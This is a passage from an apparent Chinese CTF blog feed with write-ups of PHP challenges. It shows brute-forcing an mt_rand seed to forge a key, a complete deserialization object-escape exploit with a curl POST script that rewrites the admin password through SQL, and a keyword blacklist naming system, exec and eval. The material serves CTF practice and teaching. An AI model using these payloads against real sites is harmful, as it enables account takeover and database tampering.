class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$decode_mt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$public_key</span> <span class="keyword">as</span> <span class="variable">$mt</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$decode_mt</span> = (<span class="keyword">string</span>)strpos(<span class="variable">$strings1</span>, <span class="variable">$mt</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$decode_mt</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$decode_mt</span>.<span class="string">&#x27; 0 &#x27;</span>.<span class="string">&#x27;61 &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">decode_mt();</span><br></pre></td></tr></table></figure><p>然后我们使用工具进行爆破种子<code>seed</code>，这里的<code>time</code>是用来输出程序运行时间的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure><p><img src="/post/2021-12/[MRCTF2020]Ezaudit/202112172112743.png" alt="image-20211217191437265"></p><p>得到<code>seed = 0x69cf57fb = 1775196155</code></p><p>然后我们使用<code>index.php</code>给出的代码进行生成私钥<code>private_key</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br></pre></td></tr></table></figure><p>运行上述代码的时候一定要注意两点</p><ol><li><code>php版本</code>一定要是在<code>PHP 5.2.1 to 7.0.x</code>中，程序运行中给出了这个版本，不同版本通过种子生成随机数的算法不同</li><li>一定要先输出一遍<code>public_key</code>，再输出<code>private_key</code>，这样是为了确保种子生成随机数的顺序保持一致</li></ol><p>然后直接使用万能钥匙就可以获得flag了，这里比较简单就不过多阐述了（这里被坑了，已知以为要给<code>index.php</code>传参，还搞了半天</p><p><img src="/post/2021-12/[MRCTF2020]Ezaudit/202112172112745.png" alt="image-20211217200111944"></p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> PHP </tag>
            
            <tag> 伪随机数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020 Easyphp</title>
      <link href="/post/2021-12/%5BGYCTF2020%5DEasyphp/"/>
      <url>/post/2021-12/%5BGYCTF2020%5DEasyphp/</url>
      
        <content type="html"><![CDATA[<h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h1><p><strong>考点：反序列化的对象逃逸</strong></p><p>非常典型的登陆界面，随便输了输，发现存在<code>admin</code>用户，猜测是<code>弱口令</code>，拿字典跑了一遍，无果</p><p>按照以往的做题经验，觉得可能有源码泄露，尝试<code>/www.zip</code>得到源码。一共4个文件<code>index.php、login.php、update.php、lib.php</code>，然后开始进行分析源码</p><p>在<code>update.php</code>中发现，如果成功登录就会输出<code>flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$users</span>-&gt;update();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>login.php</code>和<code>index.php</code>中没有发现利用点，显而易见，在<code>lib.php</code>中有很明显的魔术方法，猜测需要用到<code>反序列化攻击</code>，所以我们首先需要找到反序列化攻击的利用点，很明显在<code>update</code>方法中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Info</span>=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    <span class="variable">$age</span>=<span class="variable">$Info</span>-&gt;age;</span><br><span class="line">    <span class="variable">$nickname</span>=<span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">    <span class="variable">$updateAction</span>=<span class="keyword">new</span> UpdateHelper(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>],<span class="variable">$Info</span>,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里最重要的一句话<code>safe(serialize(new Info($age,$nickname)))</code>显示将<code>Info</code>类进行序列化然后经过<code>safe</code>过滤，然后再回到<code>update</code>方法中反序列化，再看看<code>safe</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实不难想到，有<code>str_replace</code>方法的存在就能猜测是<code>反序列化逃逸</code>，在之前的<code>[安洵杯 2019]easy_serialize_php</code>一题中有说到过，这个属于关键词数增加型。在序列化和反序列化过程中，字符串发生了变化，导致了反序列化时的字符串为恶意构造的代码，从而造成攻击。</p><p>现在我们首先需要找到可以利用的pop链，这里就不详细说了，直接上链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper::__destruct =&gt; User::__toString =&gt; Info::__call =&gt; dbCtrl::login</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">&#x27;select id,passwd from user where username=?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> UpdateHelper;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$o</span>);</span><br></pre></td></tr></table></figure><p>运行代码得到</p><blockquote><p>O:12:”UpdateHelper”:1:{s:3:”sql”;O:4:”User”:2:{s:3:”age”;s:43:”select id,passwd from user where username=?”;s:8:”nickname”;O:4:”Info”:1:{s:8:”CtrlCase”;O:6:”dbCtrl”:6:{s:8:”hostname”;s:9:”127.0.0.1”;s:6:”dbuser”;s:4:”root”;s:6:”dbpass”;s:4:”root”;s:8:”database”;s:4:”test”;s:4:”name”;s:5:”admin”;s:8:”password”;s:1:”1”;}}}}</p></blockquote><p>还没完，我们还需要通过逃逸来让这段恶意的字符串成功进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过上面这个代码我们发现，有两个参数是可控的，举个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age=123&amp;nikename=456</span><br><span class="line">serialize(new Info($age,$nickname)) =》</span><br><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;s:3:&quot;456&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>通过上述序列化字符串，我们可以构造出这样的参数</p><blockquote><p>age=123&amp;nickname=1”;s:8:”CtrlCase”;O:12:”UpdateHelper”:1:{s:3:”sql”;O:4:”User”:2:{s:3:”age”;s:43:”select id,passwd from user where username=?”;s:8:”nickname”;O:4:”Info”:1:{s:8:”CtrlCase”;O:6:”dbCtrl”:6:{s:8:”hostname”;s:9:”127.0.0.1”;s:6:”dbuser”;s:4:”root”;s:6:”dbpass”;s:4:”root”;s:8:”database”;s:4:”test”;s:4:”name”;s:5:”admin”;s:8:”password”;s:1:”1”;}}}};}</p></blockquote><p>此时形成的序列化字符串应该是这样的</p><blockquote><p>O:4:”Info”:3:{s:3:”age”;s:3:”123”;s:8:”nickname”;s:343:”1”;s:8:”CtrlCase”;O:12:”UpdateHelper”:1:{s:3:”sql”;O:4:”User”:2:{s:3:”age”;s:43:”select id,passwd from user where username=?”;s:8:”nickname”;O:4:”Info”:1:{s:8:”CtrlCase”;O:6:”dbCtrl”:6:{s:8:”hostname”;s:9:”127.0.0.1”;s:6:”dbuser”;s:4:”root”;s:6:”dbpass”;s:4:”root”;s:8:”database”;s:4:”test”;s:4:”name”;s:5:”admin”;s:8:”password”;s:1:”1”;}}}};}”;s:8:”CtrlCase”;N;}</p></blockquote><p>我们只需要让<code>nickname</code>字段的长度经过<code>safe</code>函数后再增长343，就可以将而已代码逃逸出去了。</p><p>所以我们最终写出了exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">&#x27;update user SET password=&quot;c4ca4238a0b923820dcc509a6f75849b&quot; where username=?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;<span class="comment">// 这里一定要写，sql中的?是占位符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> UpdateHelper;</span><br><span class="line"><span class="comment">// echo serialize($o);</span></span><br><span class="line"><span class="variable">$len</span> = strlen(<span class="string">&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;</span>.serialize(<span class="variable">$o</span>).<span class="string">&#x27;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$payload</span> = str_repeat(<span class="string">&#x27;union&#x27;</span>, <span class="variable">$len</span>).<span class="string">&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;</span>.serialize(<span class="variable">$o</span>).<span class="string">&#x27;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// echo $payload;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&quot;age&quot;</span>=&gt;<span class="string">&quot;1&quot;</span>,<span class="string">&quot;nickname&quot;</span>=&gt;<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://67f83c7f-1a30-49e5-8600-5f66e0add5a1.node4.buuoj.cn:81/update.php&#x27;</span>;</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, http_build_query(<span class="variable">$data</span>));<span class="comment">//将数组转换为URL请求字符串，否则有些时候可能服务端接收不到参数 </span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>); </span><br><span class="line"><span class="variable">$responds</span> = curl_exec(<span class="variable">$ch</span>);<span class="comment">//接受响应 </span></span><br><span class="line">curl_close(<span class="variable">$ch</span>);<span class="comment">//关闭连接 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$responds</span>;</span><br></pre></td></tr></table></figure><p>通过修改第9行的<code>sql</code>代码，这样我们就可以执行<code>sql</code>命令了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==<span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br></pre></td></tr></table></figure><p>这句话为将<code>$this-&gt;name</code>传给 sql 语句中<code>?</code>占位符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sql1:</span><br><span class="line"><span class="keyword">select</span> password,id <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span>?</span><br></pre></td></tr></table></figure><p>输出<code>password</code>，得到密码的md5值，解密后正常登录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sql2:</span><br><span class="line">update <span class="keyword">user</span> <span class="keyword">SET</span> password<span class="operator">=</span>&quot;c4ca4238a0b923820dcc509a6f75849b&quot; <span class="keyword">where</span> username<span class="operator">=</span>?</span><br></pre></td></tr></table></figure><p>修改<code>admin</code>用户的密码，<code>c4ca4238a0b923820dcc509a6f75849b</code>是<code>1</code>的md5值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sql3：</span><br><span class="line"><span class="keyword">select</span> id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span>?</span><br></pre></td></tr></table></figure><p>这个方法需要将<code>dbCtrl</code>类的<code>password</code>属性值改为<code>1</code>，利用绕过所有的<code>if</code>，从而使<code>admin</code>用户成功登录，直接返回<code>login.php</code>或刷新页面就可以得到<code>flag</code>，exp中</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 EzPHP</title>
      <link href="/post/2021-12/%5BBJDCTF2020%5DEzPHP/"/>
      <url>/post/2021-12/%5BBJDCTF2020%5DEzPHP/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h1><p><strong>考点：php的各种bypass</strong></p><p>F12发现注释</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- GFXEIM3YFZYGQ4A= --&gt;</span></span><br></pre></td></tr></table></figure><p>base32解密得到<code>1nD3x.php</code>，访问后得到源码</p><h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>魔术变量进行了黑名单过滤，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span 